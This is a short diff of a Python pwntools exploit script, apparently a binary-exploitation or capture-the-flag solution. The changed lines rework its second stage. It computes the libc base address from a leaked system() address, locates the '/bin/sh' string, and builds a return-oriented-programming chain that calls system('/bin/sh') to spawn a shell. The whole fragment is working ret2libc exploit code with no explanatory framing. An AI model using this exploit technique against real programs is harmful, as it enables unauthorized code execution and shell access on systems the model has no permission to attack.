@@ -104,19 +104,14 @@ log.info('Leaked libc_system: 0x{:x}'.format(libc_system))
 
 # Stage 2: Build ROP Chain
 
-libc_base = libc_system - libc.symbols['system']
-log.info('libc_base : 0x{:x}'.format(libc_base))
+libc.address = libc_system - libc.symbols.system
+log.info('Calculated libc base address : 0x{:x}'.format(libc.address))
 
-binsh = libc_base + libc.search("/bin/sh\x00").next()
+binsh = libc.search("/bin/sh\x00").next()
 log.info('binsh: 0x{:x}'.format(binsh))
 
-libc_exit = libc_base + libc.symbols['exit']
-log.info('libc_exit : 0x{:x}'.format(libc_exit))
-
-rop = ROP(BINARY)
-rop.raw(libc_system)
-rop.raw(0xDEADC0DE)
-rop.raw(binsh)
+rop = ROP([libc, elf])
+rop.system(binsh)
 
 log.success('Generated ROP Chain')
 log.success(rop.dump())
